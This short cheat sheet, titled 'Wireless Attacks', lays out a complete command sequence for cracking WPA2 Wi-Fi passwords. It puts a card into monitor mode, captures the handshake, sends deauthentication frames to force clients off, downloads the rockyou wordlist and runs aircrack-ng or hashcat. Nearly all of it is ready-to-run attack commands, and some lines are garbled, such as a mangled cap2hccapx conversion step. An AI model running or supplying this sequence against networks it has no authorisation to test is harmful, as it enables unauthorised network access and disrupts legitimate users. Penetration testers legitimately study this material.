# Wireless Attacks

## Cracking WPA2

```text
# put your network device into monitor mode
airmon-ng start wlan0

# listen for all nearby beacon frames to get target BSSID and channel
airodump-ng mon0

# start listening for the handshake
airodump-ng -c 6 — bssid <BSSID> -w capture/ mon0

# optionally deauth a connected client to force a handshake
aireplay-ng -0 2 -a <BSSID> -c <CLIENT> mon0

########## crack password with aircrack-ng… ########### 

download 134MB rockyou.txt dictionary file if needed
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# crack w/ aircrack-ng
aircrack-ng -a2 -b 9C:5C:8E:C9:AB:C0 -w rockyou.txt capture/-01.cap

########## or crack password with naive-hashcat ##########

#  convert cap to hccapxcap2hc
capx.bin capture/-01.cap capture/-01.hccapx

# crack with naive-hashcat
HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh

########## crack password with hashcat ##########
# hashcat64.exe -m 2500 cap.hccapx rockyou.txt -r rules\<rule> 
```

